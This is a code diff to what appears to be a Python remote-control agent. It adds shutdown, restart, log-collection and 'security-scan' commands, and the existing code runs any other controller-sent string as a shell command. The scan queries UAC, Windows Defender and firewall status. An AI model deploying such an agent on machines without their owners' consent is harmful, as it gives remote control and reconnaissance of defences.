@@ -12260,6 +12260,118 @@ def on_command(data):
                 output = "Invalid download command format. Use: download-file:file_path"
         elif command.startswith("play-voice:"):
             output = handle_voice_playback(command.split(":", 1))
+        elif command == "shutdown":
+            # Shutdown agent
+            output = "Agent shutting down..."
+            safe_emit('command_result', {
+                'agent_id': agent_id,
+                'output': output,
+                'terminal_type': 'system',
+                'timestamp': int(time.time() * 1000)
+            })
+            log_message("[SHUTDOWN] Agent shutdown requested")
+            time.sleep(1)
+            os._exit(0)
+        elif command == "restart":
+            # Restart agent
+            output = "Agent restarting..."
+            safe_emit('command_result', {
+                'agent_id': agent_id,
+                'output': output,
+                'terminal_type': 'system',
+                'timestamp': int(time.time() * 1000)
+            })
+            log_message("[RESTART] Agent restart requested")
+            time.sleep(1)
+            if WINDOWS_AVAILABLE:
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+            else:
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+        elif command == "collect-logs":
+            # Collect system logs
+            try:
+                logs = []
+                if WINDOWS_AVAILABLE:
+                    # Windows: Get recent Event Viewer logs
+                    result = execute_command("powershell -Command \"Get-EventLog -LogName System -Newest 100 | Select-Object TimeGenerated, EntryType, Source, Message | ConvertTo-Json\"")
+                    logs.append("=== Windows System Event Logs (Last 100) ===")
+                    if isinstance(result, dict):
+                        logs.append(result.get('output', ''))
+                    else:
+                        logs.append(str(result))
+                else:
+                    # Linux: Get syslog
+                    result = execute_command("tail -n 100 /var/log/syslog")
+                    logs.append("=== System Logs (Last 100 lines) ===")
+                    if isinstance(result, dict):
+                        logs.append(result.get('output', ''))
+                    else:
+                        logs.append(str(result))
+                
+                output = "\n".join(logs)
+            except Exception as e:
+                output = f"Error collecting logs: {e}"
+        elif command == "security-scan":
+            # Run security assessment
+            try:
+                scan_results = []
+                scan_results.append("=== Security Scan Results ===\n")
+                
+                # Check UAC status
+                if WINDOWS_AVAILABLE:
+                    scan_results.append("1. UAC Status:")
+                    result = execute_command("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA")
+                    if isinstance(result, dict):
+                        scan_results.append(result.get('output', ''))
+                    else:
+                        scan_results.append(str(result))
+                    scan_results.append("")
+                
+                # Check Windows Defender
+                if WINDOWS_AVAILABLE:
+                    scan_results.append("2. Windows Defender Status:")
+                    result = execute_command("powershell -Command \"Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled | ConvertTo-Json\"")
+                    if isinstance(result, dict):
+                        scan_results.append(result.get('output', ''))
+                    else:
+                        scan_results.append(str(result))
+                    scan_results.append("")
+                
+                # Check firewall status
+                scan_results.append("3. Firewall Status:")
+                if WINDOWS_AVAILABLE:
+                    result = execute_command("netsh advfirewall show allprofiles state")
+                else:
+                    result = execute_command("sudo ufw status")
+                if isinstance(result, dict):
+                    scan_results.append(result.get('output', ''))
+                else:
+                    scan_results.append(str(result))
+                scan_results.append("")
+                
+                # Check running processes
+                scan_results.append("4. High-Risk Processes:")
+                if WINDOWS_AVAILABLE:
+                    result = execute_command("powershell -Command \"Get-Process | Where-Object {$_.CPU -gt 50} | Select-Object ProcessName, CPU, WorkingSet | ConvertTo-Json\"")
+                else:
+                    result = execute_command("ps aux | awk '{if($3>50.0) print $0}'")
+                if isinstance(result, dict):
+                    scan_results.append(result.get('output', ''))
+                else:
+                    scan_results.append(str(result))
+                
+                scan_results.append("\n=== Scan Complete ===")
+                output = "\n".join(scan_results)
+            except Exception as e:
+                output = f"Error running security scan: {e}"
+        elif command == "update-agent":
+            # Placeholder for agent update mechanism
+            output = "Agent update mechanism not yet implemented.\n"
+            output += "Future implementation will:\n"
+            output += "1. Download latest agent version from controller\n"
+            output += "2. Verify signature\n"
+            output += "3. Replace current executable\n"
+            output += "4. Restart with new version"
         elif command != "sleep":
             output = execute_command(command)
         
@@ -12335,7 +12447,108 @@ def on_execute_command(data):
             "systeminfo": lambda: execute_command("systeminfo" if WINDOWS_AVAILABLE else "uname -a"),
         }
         
-        if command in internal_commands:
+        # Handle bulk action commands
+        if command == "shutdown":
+            output = "Agent shutting down..."
+            success = True
+            safe_emit('command_result', {
+                'agent_id': our_agent_id,
+                'execution_id': execution_id,
+                'output': output,
+                'success': True,
+                'execution_time': 0
+            })
+            log_message("[SHUTDOWN] Agent shutdown requested via bulk action")
+            time.sleep(1)
+            os._exit(0)
+        elif command == "restart":
+            output = "Agent restarting..."
+            success = True
+            safe_emit('command_result', {
+                'agent_id': our_agent_id,
+                'execution_id': execution_id,
+                'output': output,
+                'success': True,
+                'execution_time': 0
+            })
+            log_message("[RESTART] Agent restart requested via bulk action")
+            time.sleep(1)
+            if WINDOWS_AVAILABLE:
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+            else:
+                os.execv(sys.executable, [sys.executable] + sys.argv)
+        elif command == "collect-logs":
+            try:
+                logs = []
+                if WINDOWS_AVAILABLE:
+                    result = execute_command("powershell -Command \"Get-EventLog -LogName System -Newest 100 | Select-Object TimeGenerated, EntryType, Source, Message | ConvertTo-Json\"")
+                    logs.append("=== Windows System Event Logs (Last 100) ===")
+                    if isinstance(result, dict):
+                        logs.append(result.get('output', ''))
+                    else:
+                        logs.append(str(result))
+                else:
+                    result = execute_command("tail -n 100 /var/log/syslog")
+                    logs.append("=== System Logs (Last 100 lines) ===")
+                    if isinstance(result, dict):
+                        logs.append(result.get('output', ''))
+                    else:
+                        logs.append(str(result))
+                output = "\n".join(logs)
+            except Exception as e:
+                output = f"Error collecting logs: {e}"
+                success = False
+        elif command == "security-scan":
+            try:
+                scan_results = []
+                scan_results.append("=== Security Scan Results ===\n")
+                if WINDOWS_AVAILABLE:
+                    scan_results.append("1. UAC Status:")
+                    result = execute_command("reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA")
+                    if isinstance(result, dict):
+                        scan_results.append(result.get('output', ''))
+                    else:
+                        scan_results.append(str(result))
+                    scan_results.append("")
+                    scan_results.append("2. Windows Defender Status:")
+                    result = execute_command("powershell -Command \"Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled | ConvertTo-Json\"")
+                    if isinstance(result, dict):
+                        scan_results.append(result.get('output', ''))
+                    else:
+                        scan_results.append(str(result))
+                    scan_results.append("")
+                scan_results.append("3. Firewall Status:")
+                if WINDOWS_AVAILABLE:
+                    result = execute_command("netsh advfirewall show allprofiles state")
+                else:
+                    result = execute_command("sudo ufw status")
+                if isinstance(result, dict):
+                    scan_results.append(result.get('output', ''))
+                else:
+                    scan_results.append(str(result))
+                scan_results.append("")
+                scan_results.append("4. High-Risk Processes:")
+                if WINDOWS_AVAILABLE:
+                    result = execute_command("powershell -Command \"Get-Process | Where-Object {$_.CPU -gt 50} | Select-Object ProcessName, CPU, WorkingSet | ConvertTo-Json\"")
+                else:
+                    result = execute_command("ps aux | awk '{if($3>50.0) print $0}'")
+                if isinstance(result, dict):
+                    scan_results.append(result.get('output', ''))
+                else:
+                    scan_results.append(str(result))
+                scan_results.append("\n=== Scan Complete ===")
+                output = "\n".join(scan_results)
+            except Exception as e:
+                output = f"Error running security scan: {e}"
+                success = False
+        elif command == "update-agent":
+            output = "Agent update mechanism not yet implemented.\n"
+            output += "Future implementation will:\n"
+            output += "1. Download latest agent version from controller\n"
+            output += "2. Verify signature\n"
+            output += "3. Replace current executable\n"
+            output += "4. Restart with new version"
+        elif command in internal_commands:
             try:
                 output = internal_commands[command]()
                 if output is None:
